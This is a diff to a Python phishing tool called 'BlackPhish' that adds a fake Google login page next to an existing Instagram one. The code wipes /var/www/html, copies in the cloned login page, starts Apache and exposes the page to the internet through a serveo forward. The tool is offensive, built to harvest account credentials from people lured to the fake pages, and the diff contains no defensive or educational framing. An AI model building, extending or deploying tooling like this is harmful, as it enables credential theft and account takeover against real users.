@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# version 2.1: - Changed some colors and user interface - Added a menu
+# version 2.2: - Added Google Site
 
 # Please update version number each time we update
 
@@ -68,17 +68,25 @@ def banner():
         ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
         
                 
-                    Banner made by: \033[91m[tuf_unkn0wn]\033[94;1m
+                    Banner made by: \033[91;1m[tuf_unkn0wn]\033[94;1m
                     
-                    Script created by: \033[91m[inc0gnit0] [retro0001]\033[94;1m
+                    Script created by: \033[91;1m[inc0gnit0] [retro0001]\033[94;1m
                     
-                    Websites created by: \033[91m[TableFlipGod] \033[0m''')
-    print('\n')
-    print(red + '        [1] ' + blue + 'Instagram')
-    print('\n')
+                    Websites created by: \033[91;1m[TableFlipGod] \033[91;1m 
+                    
+                    
+                    
+        [1]\033[94;1m Instagram \033[91;1m
+        
+        [2]\033[94;1m Google
+        
+        
+        \033[0m''')
 
 # Main Script #
 def main():
+    os.system('clear') # clear #
+    
     banner()
 
     choice = input(red + "        [BlackPhish] -> ") # Get user input #
@@ -88,7 +96,20 @@ def main():
         print(green + '[+] Copying Files')
         print(green + '[+] Cleaning /var/www/html/')
         os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
-        os.system('cp '+'-r '+ cwd  + '/Instagram/Instagram-Login/index.html' " /var/www/html/")
+        os.system('cp '+'-r '+ cwd  + '/Websites/Instagram/Instagram-Login/index.html' " /var/www/html/")
+        print(green + '[+] Starting Apache2 Service')
+        os.system('service apache2 start')
+        print(green + '[+] Apache2 Service Started')
+        serveo_forward()
+        print(green + '[+] Done')
+        main()
+        
+    # Host Google Page #
+    elif choice == '2':
+        print(green + '[+] Copying Files')
+        print(green + '[+] Cleaning /var/www/html/')
+        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
+        os.system('cp '+'-r '+ cwd  + '/Websites/Google/index.html' " /var/www/html/")
         print(green + '[+] Starting Apache2 Service')
         os.system('service apache2 start')
         print(green + '[+] Apache2 Service Started')
